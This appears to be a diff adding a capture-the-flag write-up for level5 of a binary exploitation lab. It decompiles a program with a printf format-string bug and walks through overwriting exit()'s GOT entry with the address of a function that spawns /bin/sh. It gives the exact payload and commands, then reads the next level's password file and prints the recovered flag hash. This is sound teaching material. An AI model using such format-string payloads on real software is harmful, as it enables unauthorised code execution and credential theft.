@@ -1,0 +1,85 @@
+As usual we use scp and Ghidra to decompilate the program.
+scp -r  -P 4242 level5@192.168.56.102:/home/user/level5 .
+
+then we get this part of code:
+
+void o(void)
+
+{
+  system("/bin/sh");
+                    // WARNING: Subroutine does not return
+  _exit(1); 
+}
+
+void n(void)
+
+{
+  char local_20c [520];
+  
+  fgets(local_20c,0x200,stdin);
+  printf(local_20c);
+                    // WARNING: Subroutine does not return
+  exit(1);
+}
+
+void main(void)
+
+{
+  n();
+  return;
+}
+
+So we have something like level4 but this time we have to call the function o() to get the shell.
+
+Soooo let s get the address of o() gdb:
+gdb ./level5
+(gdb) info functions
+0x080484a4  o
+
+080484a4 = 134513828  ---> convert this address in decimal (we can do this with python too)
+134513828 - 4 ("\x38\x98\x04\x08") = 134513824
+
+now we have to find the address of exit :
+(gdb) disass n
+Dump of assembler code for function n:
+   0x080484c2 <+0>:	push   %ebp
+   0x080484c3 <+1>:	mov    %esp,%ebp
+   0x080484c5 <+3>:	sub    $0x218,%esp
+   0x080484cb <+9>:	mov    0x8049848,%eax
+   0x080484d0 <+14>:	mov    %eax,0x8(%esp)
+   0x080484d4 <+18>:	movl   $0x200,0x4(%esp)
+   0x080484dc <+26>:	lea    -0x208(%ebp),%eax
+   0x080484e2 <+32>:	mov    %eax,(%esp)
+   0x080484e5 <+35>:	call   0x80483a0 <fgets@plt>
+   0x080484ea <+40>:	lea    -0x208(%ebp),%eax
+   0x080484f0 <+46>:	mov    %eax,(%esp)
+   0x080484f3 <+49>:	call   0x8048380 <printf@plt>
+   0x080484f8 <+54>:	movl   $0x1,(%esp)
+   0x080484ff <+61>:	call   0x80483d0 <exit@plt>
+End of assembler dump.
+(gdb) disass 0x80483d0
+Dump of assembler code for function exit@plt:
+   0x080483d0 <+0>:	jmp    *0x8049838				--> The first entry for exit() is to jump to 0x8049838 address
+   0x080483d6 <+6>:	push   $0x28
+   0x080483db <+11>:	jmp    0x8048370
+End of assembler dump.
+
+address of exit : 0x8049838 in little endian : "\x38\x98\x04\x08"
+
+We want to overwrite the got entry of exit() (0x8049838) with the address of o()(080484a4).
+
+We are going to find the emplacement of the block memory in the stack :
+python -c 'print "AAAA" + "|%08x" * 18' | ./level5
+AAAA|00000200|b7fd1ac0|b7ff37d0|41414141|3830257c|30257c78|257c7838|7c783830|78383025|3830257c|30257c78|257c7838|7c783830|78383025|3830257c|30257c78|257c7838|7c783830
+
+We can see a pattern repetition in 4th emplacement (41414141) like in the level3.
+
+So now we have to pass the address of exit in little endian and the address of o() converted in decimal - 4 because we pass the little endian address of exit() ( = 4 bytes)
+So let s write this with %n in the 4th block of the memory stack. We keep open the stdin with cat to pass the input. And pipe all of this into ./level5
+(python -c 'print "\x38\x98\x04\x08" + "%134513824x%4$n"' ; cat) | ./level5
+
+We wait some time to write 134513824 (it s large) and we get the shell !!!
+now we can have the password :
+cat /home/user/level6/.pass
+
+d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31
